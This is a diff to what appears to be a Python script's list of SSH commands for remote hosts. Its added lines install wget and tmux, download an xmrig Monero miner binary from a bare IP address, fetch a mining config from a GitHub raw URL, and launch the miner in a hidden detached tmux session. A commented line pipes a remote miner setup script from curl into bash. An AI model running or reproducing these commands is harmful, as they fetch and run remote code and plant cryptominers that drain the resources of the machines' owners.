@@ -19,9 +19,11 @@ sshcmd = [
     #" df -h" # Only used for Testing
     #"curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s ADDR_HERE"
     # OLD method above new method below
-    #
+    # 
+    # "sudo yum install epel-release -y", # install epel-release on Centos!! to make sur you can get tmux + wget
+    "sudo apt install wget tmux -y", # installs wget
     "wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
-    "wget https://githubraw.com/config.json", #downloads the config file
+    "wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
     "tmux new-session -d -s 'xmrig' ./xmrig"
         
 ]
